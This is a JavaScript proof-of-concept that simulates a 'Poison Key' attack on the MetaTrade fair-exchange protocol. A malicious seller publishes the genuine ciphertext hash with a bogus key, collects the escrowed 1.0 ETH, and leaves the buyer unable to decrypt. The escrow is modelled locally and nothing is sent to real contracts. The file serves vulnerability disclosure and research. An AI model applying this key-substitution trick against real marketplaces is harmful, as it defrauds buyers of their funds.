/**
 * @file poc_poison_key_attack.js
 * @notice Formal Proof-of-Concept (PoC) Attack demonstrating the "Poison Key"
 *         vulnerability in the MetaTrade (IEEE Access 2024) protocol.
 *
 * Attack Mechanics:
 * 1. Honest Buyer escrows 1.0 ETH into MetaTrade contract.
 * 2. Malicious Seller encrypts genuine AIGC asset with legitimate key K_real.
 * 3. Malicious Seller computes genuine ciphertext hash H = SHA256(D_enc).
 * 4. Malicious Seller generates a POISONED key K_poison != K_real.
 * 5. Seller invokes grantAccess() supplying (H, K_poison_signed).
 * 6. Buyer downloads D_enc from IPFS, computes local hash H_c = SHA256(D_enc).
 * 7. H_c == H evaluates to TRUE on-chain!
 * 8. MetaTrade smart contract instantly releases the 1.0 ETH to Malicious Seller.
 * 9. Buyer decrypts K_poison and attempts to decrypt D_enc -> Decryption FAILS.
 * 10. Financial Outcome: Seller steals 1.0 ETH; Buyer loses funds and receives useless noise.
 */

const crypto = require("crypto");

console.log("================================================================================");
console.log("  PoC EXPLOIT: POISON KEY FAIR-EXCHANGE VULNERABILITY IN METATRADE (IEEE 2024)");
console.log("================================================================================\n");

// --- STEP 1: INITIAL SETUP ---
const AIGC_SOURCE_CONTENT = "CONFIDENTIAL_AIGC_3D_MODEL_ASSET_DATA_V1.0";
console.log(`[+] 1. Target AIGC Source Asset: "${AIGC_SOURCE_CONTENT}"`);

// Generate Buyer Keypair (simulated ECDSA)
const buyerECDH = crypto.createECDH("secp256k1");
buyerECDH.generateKeys();
const buyerPubKey = buyerECDH.getPublicKey();
console.log(`[+] 2. Buyer Registered Address & Public Key: ${buyerPubKey.toString("hex").slice(0, 32)}...`);

// Simulated Escrow on Smart Contract
let contractEscrow = {
    buyerFund: 1.0, // 1.0 ETH
    sellerBalance: 0.0,
    encryptedFileHash: null,
    encryptedSymmetricKey: null,
    userComparedHashes: false
};
console.log(`[+] 3. Buyer deposits 1.0 ETH into MetaTrade contract escrow.`);
console.log(`       Escrow Balance: ${contractEscrow.buyerFund} ETH | Seller Balance: ${contractEscrow.sellerBalance} ETH\n`);

// --- STEP 2: MALICIOUS SELLER PREPARATION ---
const genuineKey = crypto.randomBytes(32); // K_real
const iv = crypto.randomBytes(12);

// AES-256-GCM Encryption
const cipher = crypto.createCipheriv("aes-256-gcm", genuineKey, iv);
let encryptedData = cipher.update(AIGC_SOURCE_CONTENT, "utf8");
encryptedData = Buffer.concat([encryptedData, cipher.final()]);
const authTag = cipher.getAuthTag();
const fullCiphertext = Buffer.concat([iv, authTag, encryptedData]);

// Genuine Hash
const genuineHash = crypto.createHash("sha256").update(fullCiphertext).digest("hex");
console.log(`[*] 4. Malicious Seller encrypts asset with K_real.`);
console.log(`       Ciphertext SHA-256 Hash (H): ${genuineHash}`);

// THE EXPLOIT: Seller deliberately substitutes a POISONED key
const poisonKey = crypto.randomBytes(32); // K_poison (Random garbage)
console.log(`[!] 5. EXPLOIT ACTION: Malicious Seller crafts POISON KEY (K_poison != K_real)`);
console.log(`       K_real   : ${genuineKey.toString("hex")}`);
console.log(`       K_poison : ${poisonKey.toString("hex")}`);

// Encrypt the POISON key using Buyer's public key
// (Simulated with AES key derived from ECDH shared secret)
const sellerECDH = crypto.createECDH("secp256k1");
sellerECDH.generateKeys();
const sharedSecret = sellerECDH.computeSecret(buyerPubKey);
const keyCipher = crypto.createCipheriv("aes-256-cbc", sharedSecret.slice(0, 32), Buffer.alloc(16, 0));
let encryptedPoisonKey = keyCipher.update(poisonKey);
encryptedPoisonKey = Buffer.concat([encryptedPoisonKey, keyCipher.final()]);

// Malicious Seller executes grantAccess() on MetaTrade
contractEscrow.encryptedFileHash = genuineHash;
contractEscrow.encryptedSymmetricKey = encryptedPoisonKey;
console.log(`[*] 6. Seller calls grantAccess() with genuineHash but POISONED key payload.\n`);

// --- STEP 3: BUYER VERIFICATION (MetaTrade compareHashes) ---
console.log(`[*] 7. Buyer downloads ciphertext from IPFS and computes local hash:`);
const buyerComputedHash = crypto.createHash("sha256").update(fullCiphertext).digest("hex");
console.log(`       Buyer Hash (H_c): ${buyerComputedHash}`);
console.log(`       Comparing H_c == H: ${buyerComputedHash === contractEscrow.encryptedFileHash}`);

// MetaTrade Contract Logic (DigitalAssetContract.sol line 82-104)
if (buyerComputedHash === contractEscrow.encryptedFileHash) {
    console.log(`\n[!] 8. METATRADE SMART CONTRACT EXECUTES:`);
    console.log(`       Hashes Match! Contract marks userComparedHashes = true.`);
    console.log(`       Releasing escrowed funds to Malicious Seller...`);
    
    // Transfer funds
    contractEscrow.sellerBalance += contractEscrow.buyerFund;
    contractEscrow.buyerFund = 0.0;
    contractEscrow.userComparedHashes = true;
    
    console.log(`       RESULT -> Seller Balance: ${contractEscrow.sellerBalance} ETH | Buyer Escrow: ${contractEscrow.buyerFund} ETH`);
}

// --- STEP 4: BUYER RECOVERY ATTEMPT ---
console.log(`\n[*] 9. Buyer retrieves encrypted key from contract and decrypts it with private key:`);
const buyerSharedSecret = buyerECDH.computeSecret(sellerECDH.getPublicKey());
const keyDecipher = crypto.createDecipheriv("aes-256-cbc", buyerSharedSecret.slice(0, 32), Buffer.alloc(16, 0));
let recoveredKey = keyDecipher.update(contractEscrow.encryptedSymmetricKey);
recoveredKey = Buffer.concat([recoveredKey, keyDecipher.final()]);
console.log(`       Recovered Key: ${recoveredKey.toString("hex")}`);

console.log(`[*] 10. Buyer attempts to decrypt AIGC ciphertext using recovered key:`);
try {
    const decIv = fullCiphertext.subarray(0, 12);
    const decAuthTag = fullCiphertext.subarray(12, 28);
    const decCiphertext = fullCiphertext.subarray(28);

    const decipher = crypto.createDecipheriv("aes-256-gcm", recoveredKey, decIv);
    decipher.setAuthTag(decAuthTag);
    let decrypted = decipher.update(decCiphertext);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    console.log(`       Success: "${decrypted.toString("utf8")}"`);
} catch (err) {
    console.error(`\n[CRITICAL FAILURE] Decryption Exception: ${err.message}`);
    console.error(`--------------------------------------------------------------------------------`);
    console.error(`VULNERABILITY CONFIRMED:`);
    console.error(`1. The seller successfully extracted 1.0 ETH without supplying the legitimate key.`);
    console.error(`2. The buyer's 1.0 ETH is permanently stolen with NO recourse or refund.`);
    console.error(`3. MetaTrade's "Trust-Free" claim is mathematically broken.`);
    console.error(`--------------------------------------------------------------------------------\n`);
}
